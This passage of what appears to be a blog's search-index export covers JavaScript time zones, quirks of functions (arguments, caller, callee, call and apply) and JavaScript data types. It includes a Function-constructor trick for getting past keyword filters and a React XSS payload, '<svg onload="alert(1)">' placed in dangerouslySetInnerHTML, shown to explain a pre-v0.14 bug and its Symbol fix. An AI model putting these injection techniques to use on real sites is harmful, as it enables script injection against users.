the user’s computer time zone”, and the generated date time will be incorrect, resulting in a time difference. The correct way to use it is similar to before, where you need to call the timezone-related method, like this: // moment moment.tz('2020-12-26', 'Asia/Taipei').format() // dayjs dayjs.tz('2020-12-26', 'Asia/Taipei').format() to correctly tell the library that “this date is in Taipei, not in UTC or the user’s time zone”. SummaryWhen dealing with time, the most common problem is adding or subtracting a day. Why does the user see December 25 instead of December 26? These problems are often related to time zones, and if time zones are not handled correctly, these basic problems will arise. When dealing with time zones, as long as you remember a few principles, you can avoid these basic problems: Use standard format strings to communicate between frontend and backend. Let the frontend decide which time zone to display. When generating date time on the frontend, remember to consider whether to specify the time zone. In addition to these, I also thought of some interesting problems, such as birthdays. Birthdays should be stored as a string instead of a date time string. Suppose there is a large multinational website with a member system, and when registering, the user needs to fill in their birthday. If my birthday is December 26, 2020, and it is stored as a date time, it will be 2020-12-26T00:00:00+08:00. Now, how do we display it? Which time zone should we use? It seems that using the Taiwan time zone to display it will not cause any problems, but the system also needs to know that I am Taiwanese in order to know which time zone to use. However, the system may not have this information. So there seem to be two solutions. One is to store 2020-12-26 directly instead of a date time, and display it on the frontend as a string, not as a time. The other is to “store and display using UTC+0 time zone”, which should also not cause any problems. Dealing with time is really not easy, and we often have many erroneous assumptions about time. You can refer to Your Calendrical Fallacy Is… and Falsehoods programmers believe about time zones, which mention many erroneous beliefs. From the article, it can be seen that the native date object can no longer handle daily use, so whenever dealing with time, people usually use a library. Currently, there is a proposal worth paying attention to called Temporal, which is currently in stage 2 and hopes to become the future standard for handling date and time in JavaScript. For more detailed information, you can refer to this article: Temporal - Date &amp; Time in JavaScript today! or this presentation: Temporal walkthrough. Finally, if you use Jest to write tests, you can add process.env.TZ = &#39;Asia/Taipei&#39;; to the config to specify the time zone for the tests to run, or you can directly pass it in as an environment variable. My personal practice is to run tests in two different time zones to ensure that the tests pass correctly, rather than just getting lucky and writing the correct code.","link":"/2020/12/26/en/javascript-date-time-and-timezone/"},{"title":"Am I weird for finding JavaScript functions interesting?","text":"IntroductionIf you have written functions in other programming languages that are not first-class, you may experience some pain when writing JavaScript and wonder what you are doing - at least that’s how I feel. When I first discovered that functions can be passed around as parameters, I had to think hard about more complex code, and other behaviors of functions also confused me, such as the fact that functions are also objects, and what exactly is this. This article mainly wants to share some interesting aspects of functions. However, it is too boring to start talking about a lot of knowledge directly. I hope to arouse everyone’s curiosity about this knowledge. The best way to arouse curiosity is to provide a “question that you will also be interested in”. You will have the motivation to continue reading. Therefore, the following uses a few small questions as the opening. Although they are in the form of questions, it doesn’t matter if you can’t answer them. If you are interested in the answers to these questions, please continue reading. If you are not interested, just go straight ahead and turn left at the end. By the way, the title of this article was originally intended to be called “How much do you know about JavaScript functions” or “Interesting JavaScript functions”, but these titles are too boring, so I thought of this light novel-style (?) title. Question 1: Named function expressionGenerally, when writing a function expression, it is written like this: var fib = function(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(fib(6)) But in fact, the function behind it can also have a name, for example: var fib = function calculateFib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(calculateFib) // ??? console.log(fib(6)) The question is: What is this function called, fib or calculateFib? What will the line console.log(calculateFib) output? Since it has already been named before, why is there an extra one at the end? Question 2: apply and callEveryone knows that there are basically three ways to call a function: Direct call call apply As shown in the example below: function add(a, b) &#123; console.log(a+b) &#125; add(1, 2) add.call(null, 1, 2) add.apply(null, [1, 2]) The question is: Why do we need call and apply besides the general function call? When do we need to use them? Question 3: Creating functionsThere are several ways to create functions, basically: Function declaration Function expression Function constructor As shown below: // Function declaration function a1(str) &#123; console.log(str) &#125; // Function expression var a2 = function(str) &#123; console.log(str) &#125; // 很少看到的 Function constructor var a3 = new Function('str', 'console.log(str)') a1('hi') a2('hello') a3('world') You can see that the keyword function must be included when declaring a function. Is there a way to create a function without using the function keyword? At this point, some people may immediately think: Isn’t that an arrow function? Yes, so I have to add another restriction, which is not to use arrow functions. Some people may also think: What about methods on classes or objects? For example: var obj = &#123; hello() &#123; console.log(1) &#125; &#125; obj.hello() This is indeed a method, but I am not talking about methods on classes or objects, but a function that has nothing to do with objects, like: function add(a, b)&#123;&#125;. Can you think of any other methods? Question 4: Black magicThere is a function called log, which accepts an object and prints the str property of the object: function log(obj) &#123; console.log(obj.str) &#125; log(&#123;str: 'hello'&#125;) Now, before printing, call another function. Please use magic in that function to change the output from hello to world: function log(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125; // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; // 在這邊施展魔法 &#125; log(&#123;str: 'hello'&#125;) You can only modify the inside of the doSomeMagic function and add some code. How can you change things in another function? I would like to remind you that overwriting console.log is a solution, but unfortunately it is not what this article wants to discuss. I hope these four questions have aroused your interest. The first two questions are really practical problems that you will encounter, and the last two questions are just for fun and basically cannot be touched. Next, we will not answer them one by one, but directly talk about the knowledge related to functions. We will answer the questions when we explain the relevant paragraphs. Fun fun function(Note: This title is actually a YouTube channel. I haven’t watched it much myself, but some of my students recommend it, so I recommend it to everyone.) In JavaScript, a function is also an object, or more professionally speaking, a Callable Object, an object that can be called, and internally implements the [[Call]] method. Since it is an object, you can manipulate it in any way that is like an object: function add(a, b) &#123; return a + b &#125; // 正常呼叫 console.log(add(1, 2)) // 當成一般物件 add.age = 18 console.log(add.age) // 18 // 當成陣列 add[0] = 10 add[1] = 20 add[2] = 30 add[3] = 40 add[4] = 50 for(let i=0; i&lt;5; i++) &#123; console.log(i, add[i]) &#125; Sharp-eyed friends may notice why the array side is i&lt;5 instead of the common i&lt;add.length. This is because add is a function, so add.length will be the total number of parameters, which is 2, and this property cannot be changed, so you cannot use add.length directly: function add(a, b) &#123; return a + b &#125; // 當成陣列 add[0] = 10 add[1] = 20 add[2] = 30 add[3] = 40 add[4] = 50 add.length = 100 console.log(add.length) // 2 Using a function as a general object or an array is a situation that should be avoided because it will not happen in implementation. The most similar example is using an object as an array, the most well-known example of which is arguments inside a function, which is actually an “object-like object” or a pseudo-array or array-like object. function add(a, b) &#123; console.log(arguments) // [Arguments] &#123; '0': 1, '1': 2 &#125; console.log(arguments.length) // 2 // 像陣列一樣操作 for(let i=0; i&lt;arguments.length; i++) &#123; console.log(arguments[i]) &#125; // 可是不是陣列 console.log(Array.isArray(arguments)) // false console.log(arguments.map) // undefined &#125; add(1, 2) So how do you make this object disguised as an array become an array? There are several ways, such as calling Array.from: function add(a, b) &#123; let a1 = Array.from(arguments) console.log(Array.isArray(a1)) // true &#125; Also, calling Array.prototype.slice: function add(a, b) &#123; let a2 = Array.prototype.slice.call(arguments) console.log(Array.isArray(a2)) // true &#125; At this point, we can answer the question raised earlier. Since a function can be called directly, why do we need the apply and call methods? One of the reasons is this. You can see that when calling slice, you don’t need to pass in the array, but directly call [1,2,3].slice(), which is related to the prototype, because the slice method is actually on Array.prototype: console.log([].slice === Array.prototype.slice) // true For example, if we want to add a method called first to an array to return the first element, we would write it like this: // 提醒一下，幫不屬於自己的物件加上 prototype 不是一件好事 // 應該盡可能避免 Array.prototype.first = function() &#123; return this[0] &#125; console.log([1].first()) // 1 console.log([2,3,4].first()) // 2 But you can see that this first method has only one line: return this[0], which can actually be used for objects as well. But if I want to use it on an object, I have to directly call Array.prototype.first and change this to apply it to the object I want. So this is one of the reasons why apply and call exist. I need to change this to apply this function to where I want it, and in this case, I cannot call it like a normal function. Array.prototype.slice.call(arguments) is the reason for this. You may have seen this usage of slice, but have you ever wondered why it works? To understand the principle, you can refer to the ECMAScript Specification. In 22.1.3.25 Array.prototype.slice, you can see the relevant explanation and operation method: The first paragraph is the explanation of the parameters, the second paragraph is the operation steps, and the third paragraph is other additional explanations. You can first see the Note3 at the end: The slice function is intentionally generic; it does not require that its this value be an Array object. Therefore it can be transferred to other kinds of objects for use as a method. It is written here that this function can also be used on objects, not just arrays. Moreover, from the operation steps, you can see that HasProperty and Get are used, and objects also use these two, so it is completely okay to use them on objects. And once you know the principle, you can also turn the function mentioned earlier into an array: // 記得這邊參數一定要是三個，才能讓長度變成 3 function test(a,b,c) &#123;&#125; test[0] = 1 test[1] = 2 test[2] = 3 // function 搖身一變成為陣列 var arr = Array.prototype.slice.call(test) console.log(arr) // [1, 2, 3] Since we’ve mentioned call, let’s also mention the other two reasons we need to use call or apply. The first is when you want to pass multiple parameters, but you only have an array. What does this mean? For example, the Math.max function can actually take any number of parameters, such as: console.log(Math.max(1,2,3,4,5,6)) // 6 If you have an array and you want to find the maximum value, what do you do? You can’t just call Math.max directly, because your parameter is an array, not individual numbers. If you call it directly, you will only get NaN: var arr = [1,2,3,4] console.log(Math.max(arr)) // NaN This is where apply comes in handy. The second parameter is designed to take an array, so you can pass the array as a parameter: var arr = [1,2,3,4] console.log(Math.max.apply(null, arr)) // 4 Or you can also use the spread operator in ES6: var arr &#x3D; [1,2,3,4] console.log(Math.max(...arr)) &#x2F;&#x2F; 4 Have you ever wondered why Math.max can take an unlimited number of parameters? Actually, there’s no reason. The specification is written like this: Next, regarding the second reason to use apply or call, let’s give you a scenario: One day, Xiao Ming wanted to write a function to determine whether the parameter passed in was an object, and it couldn’t be an array or a function, just a normal object. He came up with a method called toString, recalling a few examples of toString: var arr = [] var obj = &#123;&#125; var fn = function()&#123;&#125; console.log(arr.toString()) // 空字串 console.log(obj.toString()) // [object Object] console.log(fn.toString()) // function()&#123;&#125; Since using toString on an object will result in [object Object], he used this to determine if it was a simple object. So Xiao Ming wrote this code: function isObject(obj) &#123; if (!obj || !obj.toString) return false return obj.toString() === '[object Object]' &#125; var arr = [] var obj = &#123;&#125; var fn = function()&#123;&#125; console.log(isObject(arr)) // false console.log(isObject(obj)) // true console.log(isObject(fn)) // false Okay, it looks very reasonable and can indeed determine if it’s a simple object. So what’s the problem? The problem is on the line obj.toString(). It’s too naive. What if obj overrides the toString method itself? function isObject(obj) &#123; if (!obj || !obj.toString) return false return obj.toString() === '[object Object]' &#125; var obj = &#123; toString: function() &#123; return 'I am object QQ' &#125; &#125; console.log(isObject(obj)) // false So how can we ensure that the toString we call is the one we want to call? Just like calling slice for an array, find the original function and use call or apply: function isObject(obj) &#123; if (!obj || !obj.toString) return false // 新的 return Object.prototype.toString.call(obj) === '[object Object]' // 舊的 // return obj.toString() === '[object Object]' &#125; var obj = &#123; toString: function() &#123; return 'I am object QQ' &#125; &#125; console.log(isObject(obj)) // true This way, we can ensure that we are really calling the one we want, rather than relying on the original object, which may be at risk of being overwritten. These are some of the reasons why apply and call exist, which cannot be achieved with a normal function call. (Note: The above method of judging objects may still fail in some cases, but I just want to demonstrate one of the reasons for the existence of call, not really wanting to write an isObject function.) The mysterious variable that functions come withEarlier, we mentioned that there is an automatically bound variable called arguments in a function that can get the parameter list. Although it looks like an array, it’s actually an object. And arguments actually has a magical feature, which is automatically bound to the parameters. Just look at the example below: function test(a) &#123; console.log(a) // 1 console.log(arguments[0]) // 1 a = 2 console.log(a) // 2 console.log(arguments[0]) // 2 arguments[0] = 3 console.log(a) // 3 console.log(arguments[0]) // 3 &#125; test(1) If you change a, the parameters in arguments will also change; if you change arguments, a will also change. This behavior is closest to what we usually call call by reference, even if it is reassigned, it is still bound to the original thing. I know about this behavior because of this article: JS Awakening Day12- Pass by Value, Pass by Reference and the reply from Liang Gege below, which made me realize that JS’s arguments still has this feature. Speaking of which, do you remember the fourth question at the beginning? function log(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125; // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; // 在這邊施展魔法 &#125; log(&#123;str: 'hello'&#125;) It’s using this feature of arguments: function log(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125; // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; // magic! log.arguments[0].str = 'world' &#125; log(&#123;str: 'hello'&#125;) You can get the parameters passed in from another function using log.arguments, and then use the feature that arguments and formal parameters are synchronized with each other to modify the seemingly impossible obj. What if we change the title? (function(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; &#125; Without a function name, how can we get the arguments of that anonymous function? Besides arguments, there are some parameters that are automatically passed in, such as the most common this, and a few uncommon ones, including [caller](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/caller). According to MDN: The function.caller property returns the function that invoked the specified function. It returns null for strict, async function and generator function callers. You can use caller to get which function called you, for example: function a()&#123; b() &#125; function b()&#123; console.log(b.caller) // [Function: a] &#125; a() Now that we know this feature, the problem with the anonymous function above is easily solved: (function(obj) &#123; doSomeMagic() console.log(obj.str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) // 只能改動這個函式裡面的東西 function doSomeMagic() &#123; doSomeMagic.caller.arguments[0].str = 'world' &#125; If you have never seen the caller parameter before, it’s okay because it should be avoided as much as possible in development. MDN also marks this feature as Deprecated and may be completely abandoned in the future. So, as I said at the beginning, this problem is purely for fun and has no practical teaching significance. Do you think it’s over? I thought it was over too, until I thought of another extended question when writing this article: What if even doSomeMagic becomes an anonymous function? (function() &#123; (function() &#123; // show your magic here // 只能改動這個函式 &#125;)() console.log(arguments[0].str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) Can we still achieve the goal? Let’s leave that as a cliffhanger and answer it later. Creating FunctionsI wrote so much before finally talking about function declarations because I think they are relatively boring. As I mentioned earlier, there are mainly three ways to create functions: Function declaration Function expression Function constructor Let’s talk about the third one first because it is almost never used in daily development, which is to use the function constructor to create a function: var f = new Function('str', 'console.log(str)') f(123) When we use the new keyword, we will call the constructor of the Function. If we don’t want to use new, we can write it like this: var f = Function.constructor('str', 'console.log(str)') f(123) Or you can just leave Function: var f = Function('str', 'console.log(str)') f(123) The key point here is the constructor. Let’s look at a simple example of JS object-oriented programming: function Dog(name) &#123; this.name = name &#125; Dog.prototype.sayHi = function() &#123; console.log('I am', this.name) &#125; let d = new Dog('yo') d.sayHi() // I am yo Here, d is an instance of Dog, so one of its features is that d.constructor will be the function called as the constructor, which is Dog: function Dog(name) &#123; this.name = name &#125; Dog.prototype.sayHi = function() &#123; console.log('I am', this.name) &#125; let d = new Dog('yo') d.sayHi() // I am yo console.log(d.constructor) // [Function: Dog] What can we do with this feature? Since the constructor of any function is Function.constructor, isn’t it? function test() &#123;&#125; console.log(test.constructor) // [Function: Function] console.log(test.constructor === Function.constructor) // true Combined with what we mentioned earlier, we can use the function constructor to create a function like this: function test() &#123;&#125; var f = test.constructor('console.log(123)') f() // 123 Here, test can be any function, which means that we can find any built-in function and achieve the same effect: var f1 = [].map.constructor('console.log(123)') var f2 = Math.min.constructor('console.log(456)') f1() // 123 f2() // 456 In this way, we can achieve the goal of “creating new functions without using the function keyword or arrow functions”, which is the answer to problem three at the beginning. Where is this usage usually used? It is used to bypass some checks! The common practice is to filter out the function keyword, eval, arrow functions, etc. to prevent others from executing the function. At this time, you can use constructor related things to bypass it. For example, this: Google CTF 2018 Quals Web Challenge - gCalc uses similar techniques. After discussing function constructors, the only thing left is to talk about function declaration and function expression. Let’s start with the difference between the two: // function declaration function a() &#123;&#125; // function expression var b = function() &#123;&#125; The biggest difference between the two is that a actually declares a function named a, while b is “declaring an anonymous function and assigning it to variable b“. Also, b initializes the function only when it reaches that line of code, while a initializes when entering the code block. Therefore, you can execute a even before declaring it: // function declaration a() function a() &#123; &#125; But b cannot: // function expression b() // TypeError: b is not a function var b = function () &#123;&#125; This behavior is related to hoisting. For more information, please refer to: I know you understand hoisting, but how deep do you understand it?. However, there is a mistake in one place above. I said that b is “declaring an anonymous function and assigning it to variable b“, but the function declared later actually has a name. You can throw an error to see: This function is actually called b, otherwise the stack trace record would write anonymous. This seemingly intuitive naming is actually a bit of a learning curve. This naming only takes effect when we assign the function to b. You can refer to 12.15.4 Runtime Semantics: Evaluation: After obtaining the name you want to assign, call NamedEvaluation to name the function. You can refer to 14.1.21 Runtime Semantics: NamedEvaluation: In addition to letting the JS engine automatically name it for you, you can also name it yourself. We call this a named function expression: // function expression var b = function helloB() &#123; throw 'I am b' &#125; b() Don’t confuse it with function declaration. This is still not a function declaration, but a function expression with a name. It still initializes the function when it reaches that line of code, and the name helloB is not what you think it is. You cannot call it from outside: // function expression var b = function helloB() &#123; throw 'I am b' &#125; helloB() // ReferenceError: helloB is not defined For outsiders, it only sees the variable b, not helloB. So what is the use of this function name? The first use is that it can be called inside the function: // function expression var b = function fib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(b(6)) // 8 The second is that the stack trace will also display this name instead of b: At this point, you may not feel its benefits. Let me give you another example, which should be clearer. For example, the following code: var arr = [1,2,3,4,5] var str = arr.map(function(n)&#123; return n + 1&#125;) .filter(function(n)&#123; return n % 2 === 1&#125;) .join(',') console.log(str) // 3, 5 Although everyone is used to writing arrow functions now, basically it was written like this before the arrow appeared. You may have only noticed that we passed two anonymous functions, but more precisely, the parameters passed to map and filter are two different function expressions. Suppose the function passed to filter has a problem: var arr = [1,2,3,4,5] var str = arr.map(function(n)&#123; return n + 1&#125;) .filter(function(n)&#123; throw 'errr' &#125;) .join(',') console.log(str) // 3, 5 When we debug, we will see that the stack trace sadly only displays anonymous: At this time, if we use a named function expression, we can solve this problem: This is the benefit of using named function expressions. As mentioned earlier, another benefit is that it can be called within the function, as shown in the example below: function run(fn, n) &#123; console.log(fn(n)) // 55 &#125; run(function fib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125;, 10) run is just a shell that receives a function and a parameter, then calls the function and prints the execution result. Here we pass in a named function expression to calculate the Fibonacci sequence, and because of the need for recursion, we named the function. What if an anonymous function is passed in? Can it also be recursive? Yes, it can. function run(fn, n) &#123; console.log(fn(n)) // 55 &#125; run(function (n) &#123; if (n &lt;= 1) return n return arguments.callee(n-1) + arguments.callee(n-2) &#125;, 10) The arguments object has a magical property called callee, which is explained on MDN as: callee is a property of the arguments object. It can be used to refer to the currently executing function inside the function body of that function. This is useful when the name of the function is unknown, such as within a function expression with no name (also called “anonymous functions”). In short, it can get itself, so even anonymous functions can be recursive. Okay, so if that’s the case, do you all remember the question from earlier? The one about casting spells: (function() &#123; (function() &#123; // show your magic here // 只能改動這個函式 &#125;)() console.log(arguments[0].str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) The answer is this very disgusting combination: (function() &#123; (function() &#123; // show your magic here // 只能改動這個函式 arguments.callee.caller.arguments[0].str = 'world' &#125;)() console.log(arguments[0].str) // 要讓這邊輸出的變成 world &#125;)(&#123;str: 'hello'&#125;) First, use arguments.callee to get itself, then add caller to get the function that called itself, and then modify the parameters through arguments. Answer timeLet’s answer some of the questions from earlier: var fib = function calculateFib(n) &#123; if (n &lt;= 1) return n return fib(n-1) + fib(n-2) &#125; console.log(calculateFib) // ??? console.log(fib(6)) 1. Is this function called fib or calculateFib?It’s called calculateFib, but you need to use fib outside the function to access it, and you can use calculateFib inside the function. 2. What will the line console.log(calculateFib) output?ReferenceError: calculateFib is not defined 3. Since it already has a name, why add another one at the end? You can use this name when you want to call yourself This name will appear in the stack trace 4. Why do you need to use call and apply in addition to the normal function call? When do you need to use them? When we want to pass in an array, but the original function only supports one parameter at a time When we want to customize this When we want to avoid function overrides and directly call a function 5. Is there a way to create a function without using the function keyword?Using the function constructor: var f1 = [].map.constructor('console.log(123)') var f2 = Math.min.constructor('console.log(456)') f1() // 123 f2() // 456 6. The doSomeMagic questionYou can use various disgusting combinations of arguments. SummaryThis article summarizes some of my insights into JavaScript functions. Some of them are practical, and some are just for fun, such as the doSomeMagic question, which is just for fun. Basically, changing arguments or accessing caller and callee should be avoided in implementation because there is usually no reason to do so, and even if you really want to do something, there should be a better way. As for the practical part, named function expressions are quite practical. Kyle Simpson, the author of YDKJS, advocates for using named function expressions and has put forward some benefits. For more information, please refer to: [day19] YDKJS (Scope) : Kyle Simpson 史上超級無敵討厭匿名函式（Anonymous function) Then call and apply are questions I have thought about during my early days of learning programming. I wondered why we need them when we can directly call a function. When I saw Object.prototype.toString.call(obj) in some code, I also wondered why not just use obj.toString()? Later, I learned that it is to avoid function overrides. For example, an array is also an object, but its toString has been overridden to do something similar to join. That’s why we need to call Object.prototype.toString directly because that is the behavior we want. This reminds me of some frontend interview questions that ask about the differences and usage of apply and call. I personally think that instead of asking that, it’s better to ask why we need apply and call as I did in this article. It would be more discerning and show if the person truly understands these two functions. Anyway, that’s about it. If anyone finds any interesting features related to functions, whether practical or not, feel free to share them with me. I’m always interested to know!","link":"/2020/04/18/en/javascript-function-is-awesome/"},{"title":"Counting all data types in JavaScript","text":"How many data types are there in JavaScript? And what are they? Before discussing data types, we should first know how many types there are in JavaScript and have a basic understanding of each type. Before we start, you can count them yourself and then compare your answer with mine to see if it is correct. As JavaScript evolves, this article will use the latest ECMAScript 2021 as the standard. If “spec” is mentioned below, it refers to the ECMAScript 2021 language specification . How many types are there in JavaScript?In the spec, in the sixth chapter: “ECMAScript Data Types and Values”, it talks about types and divides them into two types: Types are further subclassified into ECMAScript language types and specification types. (p.71) What are ECMAScript language types and what are specification types? Let’s start with the latter: A specification type corresponds to meta-values that are used within algorithms to describe the semantics of ECMAScript language constructs and ECMAScript language types. The specification types include Reference, List, Completion, Property Descriptor, Environment Record, Abstract Closure, and Data Block. (p.100) Specification types are named after their use in the specification and can be used to describe some syntax or algorithms in the specification. For example, you will see types such as “Reference”, “List”, and “Environment Record” in the specification. The other type, ECMAScript language types, is described in the specification as follows: An ECMAScript language type corresponds to values that are directly manipulated by an ECMAScript programmer using the ECMAScript language. (p.71) Therefore, this is the type we generally talk about in JavaScript and the topic we want to discuss in this article. So how many types are there? According to the specification: The ECMAScript language types are Undefined, Null, Boolean, String, Symbol, Number, BigInt, and Object. (p.71) So there are 8 types, namely: Undefined Null Boolean String Symbol Number BigInt Object Some people may count 7 types, excluding the latest BigInt, and some may count 6 types, excluding the Symbol added in ES6. But in any case, the answer is 8 types. Next, let’s briefly look at how the specification describes these eight types and their basic usage. 1. UndefinedThe specification describes it as follows: The Undefined type has exactly one value, called undefined. Any variable that has not been assigned a value has the value undefined. (p.72) Therefore, Undefined is a type, and undefined is a value of the Undefined type, just like “Number is a type, and 9 is a value of the Number type.”. The Undefined type has only one value, undefined. When a variable is not assigned any value, its value is undefined. This is easy to verify: var a console.log(a) // undefined Using typeof also yields the result &#39;undefined&#39;: var a if (typeof a === 'undefined') &#123; // 注意，typeof 的回傳值是字串 console.log('hello') // hello &#125; 2. NullThe specification describes it more simply: The Null type has exactly one value, called null. (p.72) Some people may not be able to distinguish between null and undefined, because these two are indeed somewhat similar. At this time, let’s take a look at a classic meme (source: Twitter @ddprrt): undefined basically means non-existent, while null means “exists but there is nothing”, giving a feeling of deliberately using null to mark “nothing”. Also, there is one thing to note, that if you use typeof, you will get the wrong result &#39;object&#39;: console.log(typeof null) // 'object' This is one of the most famous bugs in JavaScript. In this article: The history of “typeof null”, the author explains why this bug exists and provides actual early JavaScript engine code to support it. JavaScript creator Brendan Eich also left a comment below, correcting some details. 3. BooleanThe specification describes it as: The Boolean type represents a logical entity having two values, called true and false. (p.72) So the value of the Boolean type is either true or false, which everyone should be familiar with, so I won’t go into it. 4. StringThe description of String in the specification is relatively long, and we excerpt a section to see: The String type is the set of all ordered sequences of zero or more 16-bit unsigned integer values (“elements”) up to amaximum length of 2^53 - 1 elements. The String type is generally used to represent textual data in a running ECMAScript program, in which case each element in the String is treated as a UTF-16 code unit value (p.72) Above it says that a string is a sequence of 16-bit numbers, and these numbers are UTF-16 code units. The maximum length of a string is 2^53 - 1. I believe that many people may still not understand what this means after reading it. There are many things that can be said about UTF-16 and string encoding. I will write another article on this later. For now, we just need to roughly understand the definition of a string. 5. SymbolNext, let’s take a look at Symbol: The Symbol type is the set of all non-String values that may be used as the key of an Object property. Each possible Symbol value is unique and immutable. Each Symbol value immutably holds an associated value called [[Description]] that is either undefined or a String value. (p.73) Symbol is a data type added in ES6. As mentioned above, it is the only thing other than a string that can be used as a key for an object. Each Symbol value is unique. Let’s look at an example: var s1 = Symbol() var s2 = Symbol('test') // 可以幫 Symbol 加上敘述以供辨識 var s3 = Symbol('test') console.log(s2 === s3) // false，Symbol 是獨一無二的 console.log(s2.description) // test 用這個可以取得敘述 var obj = &#123;&#125; obj[s2] = 'hello' // 可以當成 key 使用 console.log(obj[s2]) // hello In short, Symbol is basically used as a key for objects. Because of its unique characteristics, it will not conflict with other keys. However, if you want, you can still use Symbol.for() to get the same Symbol, like this: var s1 = Symbol.for('a') var s2 = Symbol.for('a') console.log(s1 === s2) // true Why is this possible? When you use the Symbol.for function, it first searches a global Symbol registry to see if the Symbol exists. If it does, it returns it. If not, it creates a new one and writes it to the Symbol registry. Therefore, it doesn’t actually generate the same Symbol, it just helps you find the Symbol that was previously created. In addition, there is an important feature of hiding information. When you use for in, if the key is of type Symbol, it will not be listed: var obj = &#123; a: 1, [Symbol.for('hello')]: 2 &#125; for(let key in obj) &#123; console.log(key) // a &#125; Knowing these features of Symbol, you may be curious like me, where can Symbol actually be used and how should it be used? To find the answer to this question, let’s look at a classic practical example: React. If you have used React, you should be familiar with this syntax: function App() &#123; return ( &lt;div>hello&lt;/div> ) &#125; This syntax that mixes JavaScript and HTML is called JSX, and behind it is a Babel plugin that converts the above code to the following: function App() &#123; return ( React.createElement( 'div', // 標籤 null, // props 'hello' // children ) ) &#125; And React.createElement returns an object like this, which is what we usually call the Virtual DOM: &#123; type: 'div', props: &#123; children: 'hello' &#125;, key: null, ref: null, _isReactElement: true &#125; So in the end, it’s all JavaScript, nothing special, and React has basic protection against XSS, so unless you use the dangerouslySetInnerHTML attribute (which is intentionally designed to be so long), you cannot insert HTML, for example: function App(&#123; text &#125;) &#123; return ( &lt;div>&#123;text&#125;&lt;/div> ) &#125; const text = \"&lt;h1>hello&lt;/h1>\" ReactDOM.render( &lt;App text=&#123;text&#125; />, document.body ) The text you pass in will be placed on the DOM using textContent, so only the plain text &lt;h1&gt;hello&lt;/h1&gt; will appear, not in the form of HTML tags. Okay, these all look fine, but what if the text in the example above is not text, but an object? For example: function App(&#123; text &#125;) &#123; return ( &lt;div>&#123;text&#125;&lt;/div> ) &#125; const text = &#123; type: 'div', props: &#123; dangerouslySetInnerHTML: &#123; __html: '&lt;svg onload=\"alert(1)\">' &#125; &#125;, key: null, ref: null, _isReactElement: true &#125; ReactDOM.render( &lt;App text=&#123;text&#125; />, document.body ) Since React.createElement ultimately returns an object, we can directly convert text into the format that React.createElement returns, it will be treated as a React component, and then we can control its properties and use the dangerouslySetInnerHTML mentioned earlier to insert any value, thereby achieving XSS! This was the vulnerability in React before v0.14. As long as the attacker can pass an object as a parameter and can control these properties, XSS can be achieved. You can imagine a situation where a website has a feature to set a nickname. In the part where the nickname is displayed, the website will call an API to render a React component based on the response.data.nickname returned by the API. However, the server has a bug in setting the nickname. Although it should only be able to fill in strings, because there is no type checking, you can set the nickname to an object. Therefore, if you set the nickname to an object, you can set it as a React component like the example above, and when rendering, it will trigger XSS. What is the fix? It’s simple, just replace the original _isReactElement with Symbol: const text = &#123; type: 'div', props: &#123; children: 'hello' &#125;, key: null, ref: null, $$typeof: Symbol.for('react.element') &#125; Why does this work? Because according to the situation we imagined above, when I modify the nickname to an object, no matter what $$typeof is passed, it is not Symbol.for(&#39;react.element&#39;), because that’s the nature of Symbol. I cannot generate this value from the server. Unless I can control this object from JavaScript, but if I can control it from JavaScript, it usually means that I can execute any code (for example, I have found an XSS vulnerability). In this way, React can prevent the attack method we mentioned above. Attackers cannot pretend to be a React component through an object from the server or elsewhere, because they cannot forge Symbol, which is an important part of Symbol in practical use. Dan’s blog has an article about this, and the content above is also referenced from this blog: Why Do React Elements Have a $$typeof Property? 6. NumberThe spec for Number is also very long, let’s take a look at it briefly: The Number type has exactly 18,437,736,874,454,810,627 (that is, 2^64 - 2^53 + 3) values, representing the double-precision 64-bit format IEEE 754-2019 values as specified in the IEEE Standard for Binary Floating-Point Arithmetic, except that the 9,007,199,254,740,990 (that is, 2^53 - 2) distinct “Not-a-Number” values of the IEEE Standard are represented in ECMAScript as a single special NaN value. (p.76) It mentions the possible values for the Number type, which has a specific number. This means that this type cannot store all numbers completely, and there will be errors once it exceeds a certain range. Furthermore, the spec also states that the storage format is “double-precision 64-bit format IEEE 754-2019”, which clearly specifies the standard used for storage. This also shows that the numbers in JS are all 64-bit. The range mentioned above is a very important part, which can be seen more clearly in the example below: var a = 123456789123456789 var b = a + 1 console.log(a === b) // true console.log(a) // 123456789123456780 What! Why is the number still the same after adding one? And why is the printed value not the one we set initially? If you think about it carefully, you will find that it is very reasonable according to the storage mechanism of Number. As mentioned above, Number in JS is a 64-bit number, and 64 bits is a limited space, so the numbers that can be stored are also limited. This is like the pigeonhole principle. If you have N cages and N+1 pigeons, and you put all the pigeons into the cages, there must be two pigeons in the same cage. The same goes for Number. The storage space is limited, and the numbers are infinite, so you cannot store all numbers accurately, and there will be errors. Regarding other details, I will write another article specifically discussing numbers later. 7. BigIntBigInt is a type added in ES2020, described as follows: The BigInt type represents an integer value. The value may be any size and is not limited to a particular bit-width. (p.85) As you can see, there is a very obvious difference between BigInt and Number. Theoretically, BigInt can store numbers without any upper limit. From this, we can roughly guess when to use BigInt and when to use Number. If we rewrite the example of Number using BigInt, there will be no problem: var a = 123456789123456789n // n 代表 BigInt var b = a + 1n console.log(a === b) // false console.log(a) // 123456789123456789n This is why we need BigInt. More details will be discussed in another article later. 8. ObjectFinally, let’s take a look at our Object. I will excerpt some key points: An Object is logically a collection of properties. Properties are identified using key values. A property key value is either an ECMAScript String value or a 